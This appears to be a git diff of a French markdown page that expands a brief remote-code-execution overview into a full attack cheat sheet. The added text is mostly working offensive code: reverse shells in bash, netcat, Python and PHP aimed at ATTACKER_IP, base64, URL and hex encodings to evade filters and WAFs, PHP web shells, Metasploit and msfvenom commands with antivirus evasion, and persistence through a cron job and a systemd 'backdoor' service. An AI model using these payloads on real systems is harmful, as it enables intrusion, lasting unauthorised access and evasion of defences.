@@ -4,58 +4,279 @@ date: "2025-07-15"
 draft: false
 ---
 
-# 💻 Remote Code Execution (RCE)
+# 💻 Remote Code Execution - Cheat Sheet
 
-## Qu'est-ce que la Remote Code Execution ?
-
-La Remote Code Execution (RCE) permet d'exécuter du code arbitraire à distance sur un serveur ou une machine cible, souvent via une faille logicielle.
-
-## 🎯 Objectifs pédagogiques
-
-- Comprendre le concept de RCE
-- Savoir identifier et exploiter une faille RCE
-
-## 📋 Exemples de scénarios et commandes
-
-- Exploiter une injection de commande pour obtenir un shell
-- Utiliser un payload pour exécuter du code à distance
-- Prendre le contrôle d'un serveur via une faille RCE
-
-## 🛡️ Bonnes pratiques
-
-- Mettre à jour régulièrement les logiciels
-- Restreindre les droits d'exécution
-- Surveiller les logs d'exécution de commandes
-
-## 📚 Ressources utiles
-
-- [OWASP - RCE](https://owasp.org/www-community/attacks/Remote_Code_Execution)
-- [HackTricks - RCE](https://book.hacktricks.xyz/pentesting-web/rce)
-
-## 🛠️ Outils et commandes les plus utilisés
-
-- **curl** : Tester l'injection de commandes
-  ```bash
-  curl -X POST -d 'cmd=whoami' http://site-vulnerable/exec.php
-  ```
-- **Burp Suite** : Automatiser et manipuler les requêtes
-- **Metasploit** : Exploiter automatiquement des failles RCE
-  ```bash
-  msfconsole
-  use exploit/multi/http/php_cgi_arg_injection
-  set RHOSTS site-vulnerable
-  run
-  ```
-- **ncat / socat** : Reverse shell
-  ```bash
-  ncat -lvnp 4444
-  bash -i >& /dev/tcp/attacker/4444 0>&1
-  ```
-- **msfvenom** : Générer des payloads personnalisés
-  ```bash
-  msfvenom -p php/reverse_php LHOST=attacker LPORT=4444 -f raw > shell.php
-  ```
+## 🎯 Vue d'ensemble
+Les techniques d'exécution de code à distance permettent d'exécuter du code arbitraire sur un serveur cible via des vulnérabilités web, réseau ou système.
 
 ---
 
-_Dernière mise à jour : 15 juillet 2025_
+## 🔍 Détection et Énumération
+
+### Tests de Base
+```bash
+# Test simple d'injection de commande
+# Pourquoi : Vérifier si le serveur exécute des commandes système
+ping -c 1 ATTACKER_IP
+curl http://ATTACKER_IP:8080/test
+wget http://ATTACKER_IP:8080/test
+
+# Test avec time delay
+# Pourquoi : Détecter les injections aveugles (blind) via les délais
+sleep 5
+ping -c 5 127.0.0.1
+```
+
+### Paramètres à Tester
+```bash
+# Paramètres web courants
+# Pourquoi : Ces paramètres sont souvent utilisés pour l'exécution de commandes
+cmd=whoami
+command=id
+exec=ls
+system=hostname
+shell=uname
+```
+
+---
+
+## 🛠️ Payloads d'Exploitation
+
+### Shells Interactifs
+```bash
+# Bash reverse shell
+# Pourquoi : Créer une connexion shell inversée pour éviter les firewalls
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+
+# Netcat reverse shell
+# Pourquoi : Alternative simple pour les connexions shell
+nc -e /bin/bash ATTACKER_IP 4444
+nc ATTACKER_IP 4444 -e /bin/bash
+
+# Python reverse shell
+# Pourquoi : Python est souvent disponible sur les serveurs
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+
+# PHP reverse shell
+# Pourquoi : PHP est très courant sur les serveurs web
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### Encodage et Obfuscation
+```bash
+# Base64 encoding
+# Pourquoi : Contourner les filtres qui bloquent les caractères spéciaux
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=' | base64 -d | bash
+
+# URL encoding
+# Pourquoi : Éviter la détection par les WAF et filtres web
+%3Bbash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261
+
+# Hex encoding
+# Pourquoi : Contourner les filtres qui analysent les chaînes de caractères
+\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x41\x54\x54\x41\x43\x4b\x45\x52\x5f\x49\x50\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31
+```
+
+---
+
+## 🌐 Exploitation Web
+
+### PHP
+```php
+// Évaluation de code
+// Pourquoi : Ces fonctions permettent l'exécution de code PHP
+<?php system($_GET['cmd']); ?>
+<?php exec($_POST['command']); ?>
+<?php shell_exec($_REQUEST['exec']); ?>
+
+// Include de fichiers
+// Pourquoi : Permet d'inclure et exécuter du code depuis des fichiers
+<?php include($_GET['file']); ?>
+<?php require($_POST['page']); ?>
+
+// Upload de fichiers
+// Pourquoi : Créer des backdoors via l'upload de fichiers
+<?php if(isset($_FILES['file'])) { move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']); } ?>
+```
+
+### Python
+```python
+# Flask/Django
+# Pourquoi : Frameworks web populaires qui peuvent avoir des vulnérabilités
+import os
+os.system(request.args.get('cmd'))
+
+# Évaluation de code
+# Pourquoi : Permet l'exécution dynamique de code Python
+eval(request.form['code'])
+exec(request.get('command'))
+```
+
+### Node.js
+```javascript
+// Child process
+// Pourquoi : Exécuter des commandes système depuis Node.js
+const { exec } = require('child_process');
+exec(req.query.cmd, (error, stdout, stderr) => {
+    res.send(stdout);
+});
+
+// Évaluation
+// Pourquoi : Exécuter du code JavaScript dynamiquement
+eval(req.body.code);
+```
+
+---
+
+## 🔧 Outils d'Exploitation
+
+### Metasploit
+```bash
+# Exploit générique
+# Pourquoi : Framework d'exploitation automatisé
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x86/shell_reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 4444
+run
+
+# Exploit spécifique
+# Pourquoi : Exploits ciblés pour des vulnérabilités spécifiques
+use exploit/multi/http/php_cgi_arg_injection
+set RHOSTS TARGET_IP
+set TARGETURI /cgi-bin/php
+run
+```
+
+### Burp Suite
+```bash
+# Intercepter et modifier les requêtes
+# Pourquoi : Analyser et manipuler le trafic HTTP
+# Ajouter des payloads dans les paramètres
+# Utiliser l'Intruder pour fuzzer
+```
+
+### Netcat
+```bash
+# Listener
+# Pourquoi : Outil simple pour écouter les connexions entrantes
+nc -lvnp 4444
+
+# Bind shell
+# Pourquoi : Créer un shell sur le port spécifié
+nc -lvnp 4444 -e /bin/bash
+
+# Reverse shell
+# Pourquoi : Se connecter à un listener distant
+nc ATTACKER_IP 4444 -e /bin/bash
+```
+
+---
+
+## 📁 Upload de Fichiers
+
+### Web Shells
+```php
+<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php passthru($_POST['cmd']); ?>
+```
+
+### Fichiers Malveillants
+```bash
+# Générer un payload avec msfvenom
+# Pourquoi : Créer des payloads personnalisés et encodés
+msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php
+
+# Encoder le payload
+# Pourquoi : Éviter la détection par les antivirus
+msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -e php/base64 > shell.php
+```
+
+---
+
+## 🎯 Techniques Avancées
+
+### Bypass de Filtres
+```bash
+# Contourner les espaces
+# Pourquoi : Certains filtres bloquent les espaces dans les commandes
+${IFS}whoami
+$IFS$9whoami
+%09whoami
+
+# Contourner les caractères spéciaux
+# Pourquoi : Éviter la détection des caractères dangereux
+who`echo -e '\x61'`mi
+who$(echo -e '\x61')mi
+
+# Contourner les mots-clés
+# Pourquoi : Éviter les filtres basés sur des mots-clés
+w'h'o'a'm'i
+w"h"o"a"m"i
+```
+
+### Évasion de WAF
+```bash
+# Encodage multiple
+# Pourquoi : Contourner les WAF qui décodent une seule fois
+echo 'whoami' | base64 | base64
+echo 'd2hvYW1pCg==' | base64 -d | bash
+
+# Variables d'environnement
+# Pourquoi : Utiliser des variables système pour masquer les commandes
+$PATH
+$HOME
+$USER
+```
+
+---
+
+## 🔍 Post-Exploitation
+
+### Stabilisation du Shell
+```bash
+# Améliorer le shell
+# Pourquoi : Obtenir un shell interactif avec historique et autocomplétion
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Avec socat
+# Pourquoi : Alternative plus robuste pour les shells
+socat file:`tty`,raw,echo=0 tcp:ATTACKER_IP:4444
+```
+
+### Persistance
+```bash
+# Cron job
+# Pourquoi : Maintenir l'accès même après redémarrage
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
+
+# Service système
+# Pourquoi : Créer un service qui se lance automatiquement
+cat > /etc/systemd/system/backdoor.service << EOF
+[Unit]
+Description=Backdoor Service
+[Service]
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable backdoor.service
+```
+
+---
+
+## 📚 Ressources
+
+- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
+- **OWASP RCE** : https://owasp.org/www-community/attacks/Remote_Code_Execution
+- **HackTricks RCE** : https://book.hacktricks.xyz/pentesting-web/rce
+- **Reverse Shell Generator** : https://www.revshells.com/
+
+---
+
+_Dernière mise à jour : 15 juillet 2025_ 
